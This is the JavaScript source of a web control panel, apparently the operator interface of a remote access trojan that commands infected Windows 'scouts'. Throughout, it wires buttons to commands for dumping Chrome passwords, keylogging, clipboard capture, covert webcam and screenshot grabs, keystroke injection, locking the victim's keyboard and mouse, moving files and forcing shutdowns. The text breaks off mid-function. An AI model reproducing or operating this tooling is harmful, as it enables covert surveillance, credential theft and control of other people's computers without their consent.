ScoutGlobals = {
    "ifc": "",
    "scoutButtonInFocus": false,
    "nameSentToServer": false,
    "reloadedPage": true,
    "isMonitorRunning": "",
    "idOfSelectedButton": "-1",
    "sleepTimeSentToServer": false,
    "canSend": false,
    "$this": undefined,
    "bridgedId": "-1",
    "error": true,
    "loading": false
};
$(document).ready(function () {
    // SCOUTS INTERFACE !!
    function onStart () {
        $("#div_scouts_table_heading").hide();
        $("#div_scouts_table").hide();
        $("#div_direct").hide();
        loader("-1");
        ScoutGlobals.ifc = "Scouts";
    }
    onStart();

    $(document).on('focusout', '.td_scouts_table_name', function () {
        if ($(this).text() !== "" && !ScoutGlobals.scoutButtonInFocus) {
            if (!ScoutGlobals.nameSentToServer) {
                ScoutGlobals.nameSentToServer = true;
                triggerAjax("rename " + $(this).attr('id').split('_')[4] + " " + $(this).text(), true, '/scouts_process', pauseCB, {});
            }
        }
    });
    function pauseCB(data) {
        if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $(".button_scouts_table").click(function() {
        ScoutGlobals.scoutButtonInFocus = true;
        ScoutGlobals.canSend = true;
        tableRowClickable(true);
        loader($(this).attr('id').split('_')[4]);
        ScoutGlobals.$this = $(this);
        $("body").off("click", "#table_scouts tr");
        $("body").on("click", "#table_scouts tr", function(){
            if (ScoutGlobals.canSend && ScoutGlobals.$this.attr('id') !== "button_scouts_table_bridge_0") {
                ScoutGlobals.canSend = false;
                $(".button_scouts_table").prop('disabled', true);
                ScoutGlobals.idOfSelectedButton = ScoutGlobals.$this.attr('id').split('_')[4];
                let command = ScoutGlobals.$this.attr('id').split('_')[3];
                let rowId = $(this).attr('id').split('_')[3];
                $("#i_scouts_table_spinner_" + rowId).show();
                if (command === "sleep") {
                    $("#div_scouts_table_sleep").show();
                    $("#button_scouts_table_scout_sleep_time").click(function() {
                        let time;
                        if ($("#input_scouts_table_scout_sleep_time").val() !== "") {
                            if (parseInt($("#input_scouts_table_scout_sleep_time").val(), 10) > 0) {
                                time = String($("#input_scouts_table_scout_sleep_time").val());
                            }
                            else {
                                time = "10";
                            }
                        } else {
                            time = "10";
                        }
                        $("#input_scouts_table_scout_sleep_time").val("");
                        $("#div_scouts_table_sleep").hide();
                        triggerAjax(command +  " " + rowId + " " + time, true, '/scouts_process', sleepScoutFunctionCB, {"rowId": rowId});
                    });
                    $(".button_scouts_table").prop('disabled', false);
                    return;
                }
                triggerAjax(command +  " " + rowId, true, '/scouts_process', standardScoutFunctionCB, {'command': command, "rowId": rowId});
            }
        });
    });
    function sleepScoutFunctionCB(data, extra_input) {
        ScoutGlobals.idOfSelectedButton = "-1";
        ScoutGlobals.scoutButtonInFocus = false;
        tableRowClickable(false);
        loader("-1");
        $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
        $("body").off("click", "#table_scouts tr")
    }
    function standardScoutFunctionCB(data, extra_input) {
        ScoutGlobals.scoutButtonInFocus = false;
        tableRowClickable(false);
        loader("-1");
        $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
        if (extra_input.command === "ping") {
            if (data.output === "Success") {
                ScoutGlobals.error = false;
                showMessage(data.output_message);
                scrollToTop();
            } else {
                ScoutGlobals.error = true;
                showMessage(data.output_message);
                scrollToTop();
            }
        }
        $(".button_scouts_table").prop('disabled', false);
        ScoutGlobals.idOfSelectedButton = "-1";
        $("body").off("click", "#table_scouts tr")
    }

    // BRIDGING STUFF !!
    $('#button_scouts_table_bridge_0').click(function() {
        ScoutGlobals.idOfSelectedButton = "0";
        ScoutGlobals.scoutButtonInFocus = true;
        ScoutGlobals.canSend = true;
        tableRowClickable(true);
        loader("0");
        $("body").off("click", "#table_scouts tr");
        $("body").on("click", "#table_scouts tr", function(){
            if (ScoutGlobals.idOfSelectedButton === "0") {
                let rowId = $(this).attr('id').split('_')[3];
                $("#i_scouts_table_spinner_" + rowId).show();
                triggerAjax("bridge " + rowId, true, '/scouts_process', bridgeScoutFunctionCB, {});
            }
        });
    });
    function bridgeScoutFunctionCB(data){
        if (data.output === "Success") {
            ScoutGlobals.scoutButtonInFocus = false;
            ScoutGlobals.idOfSelectedButton = "-1";
            $("#h1_scouts_heading").text("Scout >> " + data.data[1]);
            ScoutGlobals.bridgedId = data.data[0];
            ScoutGlobals.ifc = "Direct";
            $("#div_scouts_table").hide();
            $("#div_scouts_table_heading").hide();
            $("#div_direct").show();
            loaderDirect("-1");
            loader("-1");
            $(".i_scouts_table_spinner").hide();
            $("#p_direct_components_console_output").html("");
            logToConsole("[*]Loading available functions...", true);
            highlightAvailableFunctions([]);
            displaySelectedFunctions("", "")
            displayComponents("");
            $("#button_direct_components_back").hide();
            triggerAjaxDirectInterface("help", true, loadScoutFunctionsCB, undefined)
        } else {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
            ScoutGlobals.ifc = "Scouts";
        }
    }
    function loadScoutFunctionsCB(data) {
        logToConsole("[+]Available functions loaded", true);
        $("body").off("click", "#table_scouts tr");
        highlightAvailableFunctions(data.data);
        displaySelectedFunctions("base", "")
    }

    // DIRECT FUNCTIONS !!
    $(".button_direct_classify_base").click(function () {
        let command = $(this).attr('id').split('_')[4];
        let id = $(this).attr('id').split('_')[5];
        loaderDirect(id);
        if (command === "sleep") {
            if (!ScoutGlobals.sleepTimeSentToServer) {
                ScoutGlobals.sleepTimeSentToServer = true;
                $("#div_direct_sleep").show();
                $("#button_direct_scout_sleep_time").unbind("click").click(function () {
                    let time;
                    if ($("#input_direct_scout_sleep_time").val() !== "") {
                        if (parseInt($("#input_direct_scout_sleep_time").val(), 10) > 0) {
                            time = String($("#input_direct_scout_sleep_time").val());
                        } else {
                            time = "10";
                        }
                    } else {
                        time = "10";
                    }
                    $("#input_direct_scout_sleep_time").val("");
                    $("#div_direct_sleep").hide();
                    triggerAjaxDirectInterface(command + " " + time, true, sleepDirectButtonCB, {});
                });
                $(".button_direct_classify_base").prop('disabled', false);
            }
            return;
        }
        triggerAjaxDirectInterface(command, true, standardDirectButtonCB, {"command": command});
    });
    function standardDirectButtonCB(data, extra_input) {
        if (data.output === "Success") {
            if (data.output_message === "return") {
                if (extra_input.command === "ping"){
                    ScoutGlobals.error = true;
                    showMessage("Scout is dead, removing from database...");
                    scrollToTop();
                }
                ScoutGlobals.ifc = "Scouts";
                loaderDirect("-1");
            } else {
                if (extra_input.command === "ping"){
                    ScoutGlobals.error = false;
                    showMessage(data.output_message);
                    scrollToTop();
                }
                loaderDirect("-1");
            }
        }
    }
    function sleepDirectButtonCB(data) {
        if (data.output_message === "return") {
            ScoutGlobals.sleepTimeSentToServer = false;
            ScoutGlobals.ifc = "Scouts";
            loaderDirect("-1");
        }
    }

    $("#button_direct_classify_main_base").click(function () {
       displaySelectedFunctions("base", "");
    });
    $("#button_direct_classify_main_read").click(function () {
       displaySelectedFunctions("read", "");
    });
    $("#button_direct_classify_main_write").click(function () {
       displaySelectedFunctions("write", "");
    });
    $("#button_direct_classify_main_execute").click(function () {
       displaySelectedFunctions("execute", "");
    });
    $("#button_direct_classify_main_persist").click(function () {
       displaySelectedFunctions("persist", "");
    });

    $("#button_direct_components_back").click(function () {
       displayComponents("");
       $("#button_direct_components_back").hide();
       $("#div_direct_classify").show();
    });

    $("#button_direct_classify_read_activeWindowsDump").click(function () {
        displaySelectedFunctions("read", "activeWindowsDump");
        displayComponents("activeWindowsDump");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_activeWindowsDump").click(function () {
        logToConsole("[>]active", true);
        triggerAjaxDirectInterface("active", true, activeWindowsDumpCB, undefined);
    });
    function activeWindowsDumpCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_checkAdmin").click(function () {
        displaySelectedFunctions("read", "checkAdmin");
        displayComponents("checkAdmin");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_checkAdmin").click(function () {
        logToConsole("[>]admin", true);
        triggerAjaxDirectInterface("admin", true, checkAdminCB, undefined);
    });
    function checkAdminCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_chromePasswordDump").click(function () {
        displaySelectedFunctions("read", "chromePasswordDump");
        displayComponents("chromePasswordDump");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_chromePasswordDump_active").click(function () {
        logToConsole("[>]chromedump active", true);
        triggerAjaxDirectInterface("chromedump active", true, chromePasswordDumpCB, undefined);
    });
    $("#button_direct_components_chromePasswordDump_passive").click(function () {
        logToConsole("[>]chromedump passive", true);
        triggerAjaxDirectInterface("chromedump passive", true, chromePasswordDumpCB, undefined);
    });
    function chromePasswordDumpCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_clipLogger").click(function () {
        displaySelectedFunctions("read", "clipLogger");
        displayComponents("clipLogger");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_clipLogger_clear").click(function () {
        logToConsole("[>]clip_clear", true);
        triggerAjaxDirectInterface("clip_clear", true, clipLoggerCB, undefined);
    });
    $("#button_direct_components_clipLogger_dump").click(function () {
        logToConsole("[>]clip_dump", true);
        triggerAjaxDirectInterface("clip_dump", true, clipLoggerCB, undefined);
    });
    $("#button_direct_components_clipLogger_set").click(function () {
        if ($("#input_direct_components_clipLogger_set").val() !== "") {
            logToConsole("[>]clip_set " + $("#input_direct_components_clipLogger_set").val(), true);
            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_clipLogger_set").val(), true, clipLoggerCB, undefined);
            $("#input_direct_components_clipLogger_set").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    function clipLoggerCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_downloadFile").click(function () {
        displaySelectedFunctions("read", "downloadFile");
        displayComponents("downloadFile");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_downloadFile").click(function () {
        if ($("#input_direct_components_downloadFile").val() !== "") {
            logToConsole("[>]download " + $("#input_direct_components_downloadFile").val(), true);
            triggerAjaxDirectInterface("download " + $("#input_direct_components_downloadFile").val(), true, downloadFileCB, undefined);
            $("#input_direct_components_downloadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });
    function downloadFileCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_downloadWeb").click(function () {
        displaySelectedFunctions("read", "downloadWeb");
        displayComponents("downloadWeb");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_downloadWeb").click(function () {
        if ($("#input_direct_components_downloadWeb_directory").val() !== "" && $("#input_direct_components_downloadWeb_url").val() !== "") {
            logToConsole("[>]download_web " + $("#input_direct_components_downloadWeb_url").val() + " " + $("#input_direct_components_downloadWeb_directory").val(), true);
            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_downloadWeb_url").val() + " " + $("#input_direct_components_downloadWeb_directory").val(), true, downloadWebCB, undefined);
            $("#input_direct_components_downloadWeb_directory").val("");
            $("#input_direct_components_downloadWeb_url").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory / url");
            scrollToTop();
        }
    });
    function downloadWebCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_getIdle").click(function () {
        displaySelectedFunctions("read", "getIdle");
        displayComponents("getIdle");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_getIdle").click(function () {
        logToConsole("[>]idle", true);
        triggerAjaxDirectInterface("idle", true, getIdleCB, undefined);
    });
    function getIdleCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_screenshot").click(function () {
        displaySelectedFunctions("read", "screenshot");
        displayComponents("screenshot");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_screenshot").click(function () {
        logToConsole("[>]screen", true);
        triggerAjaxDirectInterface("screen", true, screenshotCB, undefined);
    });
    function screenshotCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_webcam").click(function () {
        displaySelectedFunctions("read", "webcam");
        displayComponents("webcam");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_webcam").click(function () {
        logToConsole("[>]webcam", true);
        triggerAjaxDirectInterface("webcam", true, webcamCB, undefined);
    });
    function webcamCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_logger").click(function () {
        displaySelectedFunctions("read", "logger");
        displayComponents("logger");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_logger_start").click(function () {
        logToConsole("[>]key_start", true);
        triggerAjaxDirectInterface("key_start", true, loggerCB, undefined);
    });
    $("#button_direct_components_logger_stop").click(function () {
        logToConsole("[>]key_stop", true);
        triggerAjaxDirectInterface("key_stop", true, loggerCB, undefined);
    });
    $("#button_direct_components_logger_dump").click(function () {
        logToConsole("[>]key_dump", true);
        triggerAjaxDirectInterface("key_dump", true, loggerCB, undefined);
    });
    function loggerCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_read_systemInfo").click(function () {
        displaySelectedFunctions("read", "systemInfo");
        displayComponents("systemInfo");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_systemInfo").click(function () {
        logToConsole("[>]sysinfo", true);
        triggerAjaxDirectInterface("sysinfo", true, systemInfoCB, undefined);
    });
    function systemInfoCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_browser").click(function () {
        displaySelectedFunctions("write", "browser");
        displayComponents("browser");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_browser").click(function () {
        if ($("#input_direct_components_browser").val() !== "") {
            logToConsole("[>]browse " + $("#input_direct_components_browser").val(), true);
            triggerAjaxDirectInterface("browse " + $("#input_direct_components_browser").val(), true, browserCB, undefined);
            $("#input_direct_components_browser").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid url");
            scrollToTop();
        }
    });
    function browserCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_injectKeystrokes").click(function () {
        displaySelectedFunctions("write", "injectKeystrokes");
        displayComponents("injectKeystrokes");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_injectKeystrokes_get").click(function () {
        logToConsole("[>]inj_valid", true);
        triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
    });
    $("#button_direct_components_injectKeystrokes_text").click(function () {
        if ($("#input_direct_components_injectKeystrokes_text").val() !== "") {
            logToConsole("[>]inj_t " + $("#input_direct_components_injectKeystrokes_text").val(), true);
            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_injectKeystrokes_text").val(), true, injectKeystrokesCB, undefined);
            $("#input_direct_components_injectKeystrokes_text").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_injectKeystrokes_button").click(function () {
        if ($("#input_direct_components_injectKeystrokes_button").val() !== "") {
            logToConsole("[>]inj_p " + $("#input_direct_components_injectKeystrokes_button").val(), true);
            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_injectKeystrokes_button").val(), true, injectKeystrokesCB, undefined);
            $("#input_direct_components_injectKeystrokes_button").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_injectKeystrokes_combination").click(function () {
        if ($("#input_direct_components_injectKeystrokes_combination").val() !== "") {
            logToConsole("[>]inj_h " + $("#input_direct_components_injectKeystrokes_combination").val(), true);
            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_injectKeystrokes_combination").val(), true, injectKeystrokesCB, undefined);
            $("#input_direct_components_injectKeystrokes_combination").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid hotkey combination");
            scrollToTop();
        }
    });
    function injectKeystrokesCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }
    function injectKeystrokesGetCB(data) {
        let $selector = $("#p_direct_components_console_output");
        let appendString = "";
        appendString = data.data.toString().replace("[*]", "<p1 style='color: #3b78ff'>[*]</p1>")
        appendString = String.raw`${appendString}`;
        appendString = appendString.replace(/\n/g, "<br>");
        appendString = appendString + "<br>";
        $selector.append(appendString);
        $selector.scrollTop($selector.prop("scrollHeight"));
    }

    $("#button_direct_classify_write_interfaceLock").click(function () {
        displaySelectedFunctions("write", "interfaceLock");
        displayComponents("interfaceLock");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_interfaceLock_lock_keyboard").click(function () {
        logToConsole("[>]inter_lock key", true);
        triggerAjaxDirectInterface("inter_lock key", true, interfaceLockCB, undefined);
    });
    $("#button_direct_components_interfaceLock_lock_mouse").click(function () {
        logToConsole("[>]inter_lock mouse", true);
        triggerAjaxDirectInterface("inter_lock mouse", true, interfaceLockCB, undefined);
    });
    $("#button_direct_components_interfaceLock_unlock_keyboard").click(function () {
        logToConsole("[>]inter_unlock key", true);
        triggerAjaxDirectInterface("inter_unlock key", true, interfaceLockCB, undefined);
    });
    $("#button_direct_components_interfaceLock_unlock_mouse").click(function () {
        logToConsole("[>]inter_unlock mouse", true);
        triggerAjaxDirectInterface("inter_unlock mouse", true, interfaceLockCB, undefined);
    });
    function interfaceLockCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_setAudio").click(function () {
        displaySelectedFunctions("write", "setAudio");
        displayComponents("setAudio");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_setAudio_get").click(function () {
        logToConsole("[>]set_audio_range", true);
        triggerAjaxDirectInterface("set_audio_range", true, setAudioCB, undefined);
    });
    $("#button_direct_components_setAudio_set").click(function () {
        if ($("#input_direct_components_setAudio_set").val() !== "") {
            logToConsole("[>]set_audio " + $("#input_direct_components_setAudio_set").val(), true);
            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_setAudio_set").val(), true, setAudioCB, undefined);
            $("#input_direct_components_setAudio_set").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid decibel level");
            scrollToTop();
        }
    });
    function setAudioCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_systemStatusChange").click(function () {
        displaySelectedFunctions("write", "systemStatusChange");
        displayComponents("systemStatusChange");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_systemStatusChange_lock").click(function () {
        logToConsole("[>]lock", true);
        triggerAjaxDirectInterface("lock", true, systemStatusChangeCB, undefined);
    });
    $("#button_direct_components_systemStatusChange_logout").click(function () {
        logToConsole("[>]logout", true);
        triggerAjaxDirectInterface("logout", true, systemStatusChangeCB, undefined);
    });
    $("#button_direct_components_systemStatusChange_restart").click(function () {
        logToConsole("[>]restart", true);
        triggerAjaxDirectInterface("restart", true, systemStatusChangeCB, undefined);
    });
    $("#button_direct_components_systemStatusChange_shutdown").click(function () {
        logToConsole("[>]shutdown", true);
        triggerAjaxDirectInterface("shutdown", true, systemStatusChangeCB, undefined);
    });
    function systemStatusChangeCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_uploadFile").click(function () {
        displaySelectedFunctions("write", "uploadFile");
        displayComponents("uploadFile");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_uploadFile").click(function () {
        if ($("#input_direct_components_uploadFile").val() !== "") {
            logToConsole("[>]upload " + $("#input_direct_components_uploadFile").val(), true);
            triggerAjaxDirectInterface("upload " + $("#input_direct_components_uploadFile").val(), true, uploadFileCB, undefined);
            $("#input_direct_components_uploadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });
    function uploadFileCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $("#button_direct_classify_write_wallpaperChanger").click(function () {
        displaySelectedFunctions("write", "wallpaperChanger");
        displayComponents("wallpaperChanger");
        $("#button_direct_components_back").show();
        $("#div_direct_classify").hide();
    });
    $("#button_direct_components_wallpaperChanger").click(function () {
        if ($("#input_direct_components_wallpaperChanger").val() !== "") {
            logToConsole("[>]wallpaper " + $("#input_direct_components_wallpaperChanger").val(), true);
            triggerAjaxDirectInterface("wallpaper " + $("#input_direct_components_wallpaperChanger").val(), true, wallpaperChangerCB, undefined);
            $("#input_direct_components_wallpaperChanger").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });
    function wallpaperChangerCB(data) {
        if (data.output === "Success") {
            logToConsole(data.data, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }


    // SCOUT FUNCTIONS !!
    function loader(toLoad) {
        if (toLoad === "0") {
            $("#i_scouts_table_bridge_0_spinner").show();
        }
        else {
            $("#i_scouts_table_bridge_0_spinner").hide();
        }
        if (toLoad === "1") {
            $("#i_scouts_table_disconnect_1_spinner").show();
        }
        else {
            $("#i_scouts_table_disconnect_1_spinner").hide();
        }
        if (toLoad === "2") {
            $("#i_scouts_table_kill_2_spinner").show();
        }
        else {
            $("#i_scouts_table_kill_2_spinner").hide();
        }
        if (toLoad === "3") {
            $("#i_scouts_table_ping_3_spinner").show();
        }
        else {
            $("#i_scouts_table_ping_3_spinner").hide();
        }
        if (toLoad === "4") {
            $("#i_scouts_table_sleep_4_spinner").show();
        }
        else {
            $("#i_scouts_table_sleep_4_spinner").hide();
        }
    }


    // DIRECT FUNCTIONS !!
    function loaderDirect(toLoad) {
        if (toLoad === "0") {
            $("#i_direct_classify_base_disconnect_0_spinner").show();
        }
        else {
            $("#i_direct_classify_base_disconnect_0_spinner").hide();
        }
        if (toLoad === "1") {
            $("#i_direct_classify_base_kill_1_spinner").show();
        }
        else {
            $("#i_direct_classify_base_kill_1_spinner").hide();
        }
        if (toLoad === "2") {
            $("#i_direct_classify_base_ping_2_spinner").show();
        }
        else {
            $("#i_direct_classify_base_ping_2_spinner").hide();
        }
        if (toLoad === "3") {
            $("#i_direct_classify_base_sleep_3_spinner").show();
        }
        else {
            $("#i_direct_classify_base_sleep_3_spinner").hide();
        }
    }

    function activeWindowsDumpVisible(mode) {
        if (mode === "0") {
            $("#div_active_windows_dump").hide();
        } else if (mode === "1") {
            $("#div_active_windows_dump").show();
            $("#div_active_windows_dump_heading").show();
            $("#div_active_windows_dump_content").hide();
            $("#table_active_windows_dump").hide();
            $("#i_active_windows_dump_spinner").hide();
        } else if (mode === "2") {
            $("#div_active_windows_dump").show();
            $("#div_active_windows_dump_heading").show();
            $("#div_active_windows_dump_content").show();
            $("#table_active_windows_dump").show();
            $("#i_active_windows_dump_spinner").hide();
        } else if (mode === "3") {
            $("#div_active_windows_dump").show();
            $("#div_active_windows_dump_heading").show();
            $("#div_active_windows_dump_content").show();
            $("#table_active_windows_dump").hide();
            $("#i_active_windows_dump_spinner").hide();
        }
    }

    function browserVisible(mode) {
        if (mode === "0") {
            $("#div_browser").hide()
        } else if (mode === "1") {
            $("#div_browser").show();
            $("#div_browser_content").hide();
        } else if (mode === "2") {
            $("#div_browser").show();
            $("#div_browser_content").show();
        }
    }

    function highlightAvailableFunctions(l) {
        let c = "#e74856";
        if (jQuery.inArray("windows/control/active_windows_dump", l) > -1) {
            $("#button_direct_classify_read_activeWindowsDump").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_activeWindowsDump").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/check_admin", l) > -1) {
            $("#button_direct_classify_read_checkAdmin").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_checkAdmin").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/chrome_password_dump", l) > -1) {
            $("#button_direct_classify_read_chromePasswordDump").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_chromePasswordDump").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/clip_logger", l) > -1) {
            $("#button_direct_classify_read_clipLogger").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_clipLogger").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/download_file", l) > -1) {
            $("#button_direct_classify_read_downloadFile").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_downloadFile").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/download_web", l) > -1) {
            $("#button_direct_classify_read_downloadWeb").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_downloadWeb").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/get_idle", l) > -1) {
            $("#button_direct_classify_read_getIdle").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_getIdle").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/in_memory_screenshot", l) > -1) {
            $("#button_direct_classify_read_screenshot").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_screenshot").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/in_memory_webcam", l) > -1) {
            $("#button_direct_classify_read_webcam").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_webcam").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/key_and_window_logger", l) > -1) {
            $("#button_direct_classify_read_logger").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_logger").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/system_info_grabber", l) > -1) {
            $("#button_direct_classify_read_systemInfo").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_read_systemInfo").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/browser", l) > -1) {
            $("#button_direct_classify_write_browser").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_browser").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/inject_keystrokes", l) > -1) {
            $("#button_direct_classify_write_injectKeystrokes").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_injectKeystrokes").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/interface_lock", l) > -1) {
            $("#button_direct_classify_write_interfaceLock").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_interfaceLock").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/set_audio", l) > -1) {
            $("#button_direct_classify_write_setAudio").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_setAudio").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/system_status_change", l) > -1) {
            $("#button_direct_classify_write_systemStatusChange").prop('disabled', false).css("background-color", "#2f3136");
        } else {
            $("#button_direct_classify_write_systemStatusChange").prop('disabled', true).css("background-color", c);
        }

        if (jQuery.inArray("windows/control/upload_file", l) > -1) {
